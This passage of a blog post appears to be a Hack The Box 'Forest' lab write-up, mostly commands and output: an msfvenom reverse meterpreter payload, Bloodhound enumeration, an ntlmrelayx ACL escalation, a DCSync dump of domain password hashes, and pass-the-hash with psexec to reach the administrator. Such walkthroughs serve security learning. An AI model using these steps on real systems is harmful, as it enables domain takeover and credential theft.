+<div class="highlight"><pre><span class="code-line"><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&quot;10.10.15.185&quot; LPORT=4444 -f exe &gt; shell.exe</span>
+<span class="code-line"></code></pre></div>
+
+<p>To catch the reverse meterpreter we use the <code>exploit/multi/handler</code> metasploit
+module. We can get a cmd shell using the <code>shell</code> command.</p>
+<h2 id="bloodhound">Bloodhound</h2>
+<p>As we need to elevate our privileges on a Windows environnement we want to run
+Bloodhound to see the differents relationships between the domain's users,
+groups and computers.
+We use a <a href="https://github.com/fox-it/BloodHound.py">bloodhound ingestor based on impacket</a>
+that allow to grab credentials remotly. But we get some error about DNS
+resolution probably because of our VPN configuration.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python ./bloodhound.py -d &#39;htb.local&#39; -dc 10.10.10.161 -gc 10.10.10.161 -u svc-alfresco -p s3rvice -v -ns 10.10.10.161 -c all</span>
+<span class="code-line">DEBUG: Authentication: username/password</span>
+<span class="code-line">DEBUG: Resolved collection methods: localadmin, rdp, dcom, acl, objectprops, session, group, trusts</span>
+<span class="code-line">DEBUG: Using DNS to retrieve domain information</span>
+<span class="code-line">DEBUG: Querying domain controller information from DNS</span>
+<span class="code-line">DEBUG: Using domain hint: htb.local</span>
+<span class="code-line">INFO: Found AD domain: htb.local</span>
+<span class="code-line">DEBUG: Found primary DC: FOREST.htb.local</span>
+<span class="code-line">DEBUG: Found Global Catalog server: FOREST.htb.local</span>
+<span class="code-line">DEBUG: Using LDAP server: 10.10.10.161</span>
+<span class="code-line">DEBUG: Using base DN: DC=htb,DC=local</span>
+<span class="code-line">INFO: Connecting to LDAP server: 10.10.10.161</span>
+<span class="code-line">Traceback (most recent call last):</span>
+<span class="code-line">  File &quot;./bloodhound.py&quot;, line 5, in &lt;module&gt;</span>
+<span class="code-line">    bloodhound.main()</span>
+<span class="code-line">  File &quot;/root/BloodHound.py/bloodhound/__init__.py&quot;, line 265, in main</span>
+<span class="code-line">    disable_pooling=args.disable_pooling)</span>
+<span class="code-line">  File &quot;/root/BloodHound.py/bloodhound/__init__.py&quot;, line 68, in run</span>
+<span class="code-line">    self.pdc.prefetch_info(&#39;objectprops&#39; in collect, &#39;acl&#39; in collect)</span>
+<span class="code-line">  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 330, in prefetch_info</span>
+<span class="code-line">    self.get_domains(acl=acls)</span>
+<span class="code-line">  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 204, in get_domains</span>
+<span class="code-line">    for entry in entries:</span>
+<span class="code-line">  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 106, in search</span>
+<span class="code-line">    self.ldap_connect()</span>
+<span class="code-line">  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 60, in ldap_connect</span>
+<span class="code-line">    q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)</span>
+<span class="code-line">  File &quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&quot;, line 992, in query</span>
+<span class="code-line">    timeout = self._compute_timeout(start, lifetime)</span>
+<span class="code-line">  File &quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&quot;, line 799, in _compute_timeout</span>
+<span class="code-line">    raise Timeout(timeout=duration)</span>
+<span class="code-line">dns.exception.Timeout: The DNS operation timed out after 3.0016040802 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>We edit the code of <code>/root/BloodHound.py/bloodhound/ad/domain.py</code>:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">def</span> <span class="nf">ldap_connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s1">&#39;ldap&#39;</span><span class="p">,</span> <span class="n">resolver</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span></span>
+<span class="code-line">        <span class="sd">&quot;&quot;&quot;</span></span>
+<span class="code-line"><span class="sd">        Connect to the LDAP service</span></span>
+<span class="code-line"><span class="sd">        &quot;&quot;&quot;</span></span>
+<span class="code-line">        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Connecting to LDAP server: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">        <span class="c1"># Convert the hostname to an IP, this prevents ldap3 from doing it</span></span>
+<span class="code-line">        <span class="c1"># which doesn&#39;t use our custom nameservers</span></span>
+<span class="code-line">        <span class="c1">#q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)</span></span>
+<span class="code-line">        <span class="c1">#for r in q:</span></span>
+<span class="code-line">            <span class="c1">#ip = r.address</span></span>
+<span class="code-line">        <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;10.10.10.161&quot;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The ingestor create a few JSON files:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls *.json</span>
+<span class="code-line">computers.json  domains.json  groups.json  sessions.json  users.json</span>
+<span class="code-line"></code></pre></div>
+
+<p>We start the <code>neo4j</code> database, <code>bloodhound</code> and feed him the JSON data.</p>
+<p>When using the query "Shortest Paths to High Value Targets" we get the following
+graph:</p>
+<p><img alt="Bloodhound complete view" src="/media/2020.03/forest_01.png">.</p>
+<h2 id="exchange-trusted-subsystem-and-ntlmrelayx">Exchange trusted subsystem and ntlmrelayx</h2>
+<p>Our <code>svc-alfresco</code> user got indirect right for the <code>Exchange trusted subsytem</code>
+group.
+For more information about the Active Directory Right:
+<a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights">Documentation Microsoft</a>.</p>
+<p>Therefore we want to exploit our Exchange rights using
+<a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a>.</p>
+<p>Let's create a user and add it in the <code>Exchange trusted subsytem</code> group.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; shell</span>
+<span class="code-line">Process 3256 created.</span>
+<span class="code-line">Channel 1 created.</span>
+<span class="code-line">Microsoft Windows [Version 10.0.14393]</span>
+<span class="code-line">(c) 2016 Microsoft Corporation. All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\svc-alfresco\Documents&gt;net user created_01 M&lt;redacted&gt; /add /domain</span>
+<span class="code-line">net user created_01 Marteau69! /add /domain</span>
+<span class="code-line">The command completed successfully.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\svc-alfresco\Documents&gt;net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot;</span>
+<span class="code-line">net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot;</span>
+<span class="code-line">Group name     Exchange Trusted Subsystem</span>
+<span class="code-line">Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Exchange configuration, as well as user accounts and groups. This group should not be deleted.</span>
+<span class="code-line"></span>
+<span class="code-line">Members</span>
+<span class="code-line"></span>
+<span class="code-line">-------------------------------------------------------------------------------</span>
+<span class="code-line">EXCH01$                  sol                      svc-alfresco</span>
+<span class="code-line">The command completed successfully.</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\svc-alfresco\Documents&gt;net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot; created_01 /add</span>
+<span class="code-line">net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot; created_01 /add</span>
+<span class="code-line">The command completed successfully.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We then launch <a href="https://github.com/SecureAuthCorp/impacket/">impacket's ntlmrelayx.py</a>
+with the <code>escalate-user</code> parameter. We try it by authenticating in our browser on 127.0.0.1.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user created_01</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Protocol Client SMTP loaded..</span>
+<span class="code-line">[*] Protocol Client SMB loaded..</span>
+<span class="code-line">[*] Protocol Client MSSQL loaded..</span>
+<span class="code-line">[*] Protocol Client HTTP loaded..</span>
+<span class="code-line">[*] Protocol Client HTTPS loaded..</span>
+<span class="code-line">[*] Protocol Client IMAPS loaded..</span>
+<span class="code-line">[*] Protocol Client IMAP loaded..</span>
+<span class="code-line">[*] Protocol Client LDAPS loaded..</span>
+<span class="code-line">[*] Protocol Client LDAP loaded..</span>
+<span class="code-line">[*] Running in relay mode to single host</span>
+<span class="code-line">[*] Setting up SMB Server</span>
+<span class="code-line">[*] Setting up HTTP Server</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Servers started, waiting for connections</span>
+<span class="code-line">[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161</span>
+<span class="code-line">[*] HTTPD: Client requested path: /</span>
+<span class="code-line">[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161</span>
+<span class="code-line">[*] HTTPD: Client requested path: /</span>
+<span class="code-line">[*] HTTPD: Client requested path: /</span>
+<span class="code-line">[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED</span>
+<span class="code-line">[*] Enumerating relayed user&#39;s privileges. This may take a while on large domains</span>
+<span class="code-line">[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161</span>
+<span class="code-line">[*] HTTPD: Client requested path: /favicon.ico</span>
+<span class="code-line">[*] HTTPD: Client requested path: /favicon.ico</span>
+<span class="code-line">[*] HTTPD: Client requested path: /favicon.ico</span>
+<span class="code-line">[*] User privileges found: Create user</span>
+<span class="code-line">[*] User privileges found: Modifying domain ACL</span>
+<span class="code-line">[*] Querying domain security descriptor</span>
+<span class="code-line">[*] Success! User created_01 now has Replication-Get-Changes-All privileges on the domain</span>
+<span class="code-line">[*] Try using DCSync with secretsdump.py and this user :)</span>
+<span class="code-line">[*] Saved restore state to aclpwn-20191105-184250.restore</span>
+<span class="code-line">[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED</span>
+<span class="code-line">[*] Enumerating relayed user&#39;s privileges. This may take a while on large domains</span>
+<span class="code-line">[-] Exception in HTTP request handler: [Errno 32] Broken pipe</span>
+<span class="code-line">[-] [Errno 32] Broken pipe</span>
+<span class="code-line">[*] User privileges found: Create user</span>
+<span class="code-line">[*] User privileges found: Modifying domain ACL</span>
+<span class="code-line">[-] ACL attack already performed. Refusing to continue</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="dcsync">DCSync</h2>
+<p>Our right where sufficient to escalate to get the <code>Replication-Get-Changes-All</code>
+privileges on the domain. As mention by <code>ntlmrelayx</code> we can now use a
+<a href="https://adsecurity.org/?p=1729">DCSync</a> attack on the domain using
+<a href="https://github.com/SecureAuthCorp/impacket/">impacket's secretdump.py</a> to get
+the users' passwords hashes.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python secretsdump.py &#39;htb.local/created_01:M&lt;redacted&gt;@10.10.10.161&#39;</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span>
+<span class="code-line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span>
+<span class="code-line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>
+<span class="code-line">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span>
+<span class="code-line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::</span>
+<span class="code-line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="pth">PTH</h2>
+<p>We can then use the <a href="http://blog.gentilkiwi.com/tag/pass-the-hash">Path the hash</a>
+technique with
+<a href="https://github.com/SecureAuthCorp/impacket/">impacket's psexec.py</a> to login on
+the Domain Controller as administrator and get the flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Requesting shares on 10.10.10.161.....</span>
+<span class="code-line">[*] Found writable share ADMIN$</span>
+<span class="code-line">[*] Uploading file LgnQUJxD.exe</span>
+<span class="code-line">[*] Opening SVCManager on 10.10.10.161.....</span>
+<span class="code-line">[*] Creating service evKq on 10.10.10.161.....</span>
+<span class="code-line">[*] Starting service evKq.....</span>
+<span class="code-line">[!] Press help for extra shell commands</span>
+<span class="code-line">Microsoft Windows [Version 10.0.14393]</span>
+<span class="code-line">(c) 2016 Mirosoft Corporation. All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Windows\system32&gt;cd ..</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Windows&gt;cd ..</span>
+<span class="code-line"></span>
+<span class="code-line">C:\&gt;cd Users</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users&gt;cd Administrator</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\Administrator&gt;cd Desktop</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\Administrator\Desktop&gt;type root.txt</span>
+<span class="code-line">f04815&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>What a journey. This box was classified as easy but probably needed a medium
+classification. WinRM is so <em>finicky</em>. The root part was interesting as it
+allowed us to play with Bloodhound and ntlmrelayx which doesn't happen a lot
+outside of client environments.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/03/htb-postman.html"> HTB: Postman </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/04/htb-registry.html"> HTB: Registry </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
